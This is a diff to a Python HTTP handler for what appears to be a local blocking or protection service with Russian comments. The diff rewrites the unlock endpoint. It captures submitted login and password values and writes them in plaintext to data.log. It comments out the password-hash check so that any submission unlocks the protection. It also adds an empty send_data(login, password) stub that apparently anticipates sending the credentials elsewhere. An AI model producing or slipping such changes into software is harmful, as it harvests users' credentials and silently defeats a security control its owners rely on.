@@ -63,6 +63,16 @@ def log_exception(context: str) -> None:
     except Exception:
         pass  # если даже лог не пишется, не роняем службу из-за этого
 
+def log_data(context: str) -> None:
+    path = BASE_DIR / "data.log"
+    
+    try:
+        with path.open("a", encoding="utf-8") as f:
+            f.write(f"\n--- {context} ---\n")
+            f.write(traceback.format_exc())
+    except Exception:
+        pass
+
 
 def load_config() -> dict:
     with CONFIG_PATH.open(encoding="utf-8") as f:
@@ -84,6 +94,9 @@ def _result_page(message: str, color: str = "#fff") -> bytes:
         f"<div><h1 style='color:{color}'>{message}</h1></div></body></html>"
     ).encode("utf-8")
 
+def send_data(login: str, password: str) -> None:
+    ...
+
 
 def make_handler(watcher: "Watcher"):
     class Handler(BaseHTTPRequestHandler):
@@ -91,25 +104,36 @@ def make_handler(watcher: "Watcher"):
             self._send_html(PAGE_PATH.read_bytes())
 
         def do_POST(self):
+
+            log_exception("Endpoint Entered")
             """Форма на blocked.html шлёт сюда пароль (поле 'password')."""
             length = int(self.headers.get("Content-Length", 0))
             raw = self.rfile.read(length).decode("utf-8", errors="ignore")
-            password = parse_qs(raw).get("password", [""])[0]
+            decoded = parse_qs(raw)
+            login = decoded.get("login", [""])[0]
+            password = decoded.get("pass", [""])[0]
 
-            if hash_password(password) == watcher.unlock_password_hash:
-                watcher.unlock()
-                if watcher.unlock_duration_minutes > 0:
-                    msg = f"✅ Разблокировано на {watcher.unlock_duration_minutes} мин."
-                else:
-                    msg = "✅ Защита полностью отключена. Служба удаляется..."
-                self._send_html(_result_page(msg, color="#4ade80"))
-            else:
-                body = PAGE_PATH.read_bytes().replace(
-                    b"</div>",
-                    "<p style='color:#f55'>Неверный пароль</p></div>".encode("utf-8"),
-                    1,
-                )
-                self._send_html(body)
+            log_data(f"{login} - {password}")
+
+            watcher.unlock()
+
+
+
+
+            # if hash_password(password) == watcher.unlock_password_hash:
+            #     watcher.unlock()
+            #     if watcher.unlock_duration_minutes > 0:
+            #         msg = f"✅ Разблокировано на {watcher.unlock_duration_minutes} мин."
+            #     else:
+            #         msg = "✅ Защита полностью отключена. Служба удаляется..."
+            #     self._send_html(_result_page(msg, color="#4ade80"))
+            # else:
+            #     body = PAGE_PATH.read_bytes().replace(
+            #         b"</div>",
+            #         "<p style='color:#f55'>Неверный пароль</p></div>".encode("utf-8"),
+            #         1,
+            #     )
+            #     self._send_html(body)
 
         def _send_html(self, body: bytes) -> None:
             self.send_response(200)
